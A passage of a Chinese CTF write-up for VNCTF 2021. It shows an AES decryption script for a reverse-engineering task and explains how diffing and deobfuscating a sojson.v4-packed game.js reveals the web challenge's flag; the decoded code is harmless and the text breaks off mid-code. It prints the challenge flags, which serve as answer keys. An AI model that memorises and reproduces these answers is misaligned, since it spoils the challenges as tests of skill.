python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key=unhexlify(md5(<span class="string">b&#x27;Hello from C++&#x27;</span>).hexdigest())</span><br><span class="line">cipher=unhexlify(<span class="string">&quot;B28216EE5ECD5FFAFF8254E60B4BAEAA&quot;</span>)</span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">text=aes.decrypt(cipher)</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021VNCTF/image-20210315211849020.png"></p><p>诶，都是可见字符，试图交flag，成了2333。</p><p>flag：<strong>vnctf{85df34871c68810c}</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p>赛后咨询了一下web师傅<a href="http://fxizenta.design/">@Fxizenta</a>，发现这个题原来五分钟就可以做出来（改数值，无敌+跳关），然后突然感觉我的思路真就re思维做web题，比较麻烦，但还是贴一下吧（</p><p>这种游戏一看就不可能是出题人自己写的，肯定在源码的基础上插了一些其他代码来生成&amp;输出flag（出题经验），于是对比两个文件，找到不一样的地方，就有可能是flag出现的地方。</p><p>于是先从题目的网页里拿到三个js文件，然后根据<code>game.js</code>的注释找到源码：<a href="https://github.com/KilledByAPixel/BounceBack">KilledByAPixel&#x2F;BounceBack: Boomerang Zelda Homage for JS13k</a>，把源码的三个js文件也下下来。</p><p>看名字先从<code>game.js</code>看起，比较像主函数。我这里用的是010Editor的比较文件功能（<code>Ctrl+M</code>）。</p><p><code>game_new.js</code>是题目用的<code>game.js</code>，而<code>game.js</code>是源码的<code>game.js</code>。</p><p><img src="/p/wpFor-2021VNCTF/image-20210315195359833.png"></p><p>看到的第一个差异就是sojson.v4的混淆，怀疑是这里有flag。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;sojson.v4&#x27;</span>][<span class="string">&quot;\x66\x69\x6c\x74\x65\x72&quot;</span>][<span class="string">&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;</span>]((([<span class="string">&#x27;sojson.v4&#x27;</span>]+[])[<span class="string">&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;</span>][<span class="string">&#x27;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#x27;</span>][<span class="string">&#x27;\x61\x70\x70\x6c\x79&#x27;</span>](<span class="literal">null</span>,<span class="string">&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;</span>[<span class="string">&#x27;\x73\x70\x6c\x69\x74&#x27;</span>](<span class="regexp">/[a-zA-Z]&#123;1,&#125;/</span>))))(<span class="string">&#x27;sojson.v4&#x27;</span>);</span><br></pre></td></tr></table></figure><p>然后把所有的字符串解码，有：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;sojson.v4&#x27;</span>][<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;constructor&#x27;</span>]((([<span class="string">&#x27;sojson.v4&#x27;</span>]+[])[<span class="string">&#x27;constructor&#x27;</span>][<span class="string">&#x27;fromCharCode&#x27;</span>][<span class="string">&#x27;apply&#x27;</span>](<span class="literal">null</span>,<span class="string">&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;</span>[<span class="string">&#x27;split&#x27;</span>](<span class="regexp">/[a-zA-Z]&#123;1,&#125;/</span>))))(<span class="string">&#x27;sojson.v4&#x27;</span>);</span><br></pre></td></tr></table></figure><p>通过<a href="https://my.oschina.net/u/4386603/blog/4529738">Sojson.v4手把手破解过程 - osc_hr0pxr5d的个人空间 - OSCHINA - 中文开源技术交流社区</a>这里的方法我们把以下代码拿去控制台运行，就能得到js源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(([<span class="string">&#x27;sojson.v4&#x27;</span>] + [])[<span class="string">&quot;constructor&quot;</span>][<span class="string">&#x27;fromCharCode&#x27;</span>][<span class="string">&#x27;apply&#x27;</span>](<span class="literal">null</span>, <span class="string">&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;</span> [<span class="string">&#x27;split&#x27;</span>](<span class="regexp">/[a-zA-Z]&#123;1,&#125;/</span>)))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021VNCTF/image-20210315195943051.png"></p><p>得到js源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> __encode = <span class="string">&#x27;jsjiami.com&#x27;</span>,</span><br><span class="line">    _a = &#123;&#125;,</span><br><span class="line">    _0xb483 = [<span class="string">&quot;_decode&quot;</span>, <span class="string">&quot;http://www.sojson.com/javascriptobfuscator.html&quot;</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">_0xd642x1</span>) </span>&#123;</span><br><span class="line">    _0xd642x1[_0xb483[<span class="number">0</span>]] = _0xb483[<span class="number">1</span>]</span><br><span class="line">&#125;)(_a);</span><br><span class="line"><span class="keyword">var</span> __Oxa2781 = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;-paused-&quot;</span>, <span class="string">&quot;Win! flag&#123;this_game_is_funny!&#125;&quot;</span>, <span class="string">&quot;Game Over!&quot;</span>, <span class="string">&quot;Press Escape&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;center&quot;</span>, <span class="string">&quot;undefined&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;删除&quot;</span>, <span class="string">&quot;版本号，js会定&quot;</span>, <span class="string">&quot;期弹窗，&quot;</span>, <span class="string">&quot;还请支持我们的工作&quot;</span>, <span class="string">&quot;jsjia&quot;</span>, <span class="string">&quot;mi.com&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> bigText = __Oxa2781[<span class="number">0x0</span>];</span><br><span class="line"><span class="keyword">if</span> (paused) &#123;</span><br><span class="line">    bigText = __Oxa2781[<span class="number">0x1</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (winTimer.IsSet()) &#123;</span><br><span class="line">    bigText = __Oxa2781[<span class="number">0x2</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (player.IsDead()) &#123;</span><br><span class="line">    bigText = __Oxa2781[<span class="number">0x3</span>];</span><br><span class="line">    DrawText(__Oxa2781[<span class="number">0x4</span>], mainCanvasSize[__Oxa2781[<span class="number">0x5</span>]] / <span class="number">2</span>, mainCanvasSize[__Oxa2781[<span class="number">0x6</span>]] / <span class="number">2</span> + <span class="number">80</span>, <span class="number">42</span>)</span><br><span class="line">&#125;;</span><br><span class="line">DrawText(bigText, mainCanvasSize[__Oxa2781[<span class="number">0x5</span>]] / <span class="number">2</span>, mainCanvasSize[__Oxa2781[<span class="number">0x6</span>]] / <span class="number">2</span> - <span class="number">80</span>, <span class="number">72</span>, __Oxa2781[<span class="number">0x7</span>], <span class="number">2</span>);;;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">_0x5197x2, _0x5197x3, _0x5197x4, _0x5197x5, _0x5197x6, _0x5197x7</span>) </span>&#123;</span><br><span class="line">    _0x5197x7 = __Oxa2781[<span class="number">0x8</span>];</span><br><span class="line">    _0x5197x5 = <span class="function"><span class="keyword">function</span>(<span class="params">_0x5197x8</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> alert !== _0x5197x7) &#123;</span><br><span class="line">            alert(_0x5197x8)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">console</span> !== _0x5197x7) &#123;</span><br><span class="line">            <span class="built_in">console</span>[__Oxa2781[<span class="number">0x9</span>]](_0x5197x8)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5197x4 = <span class="function"><span class="keyword">function</span>(<span class="params">_0x5197x9, _0x5197x2</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> _0x5197x9 + _0x5197x2</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5197x6 = _0x5197x4(__Oxa2781[<span class="number">0xa</span>], _0x5197x4(_0x5197x4(__Oxa2781[<span class="number">0xb</span>], __Oxa2781[<span class="number">0xc</span>]), __Oxa2781[<span class="number">0xd</span>]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _0x5197x2 = __encode;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="keyword">typeof</span> _0x5197x2 !== _0x5197x7 &amp;&amp; _0x5197x2 === _0x5197x4(__Oxa2781[<span class="number">0xe</span>], __Oxa2781[<span 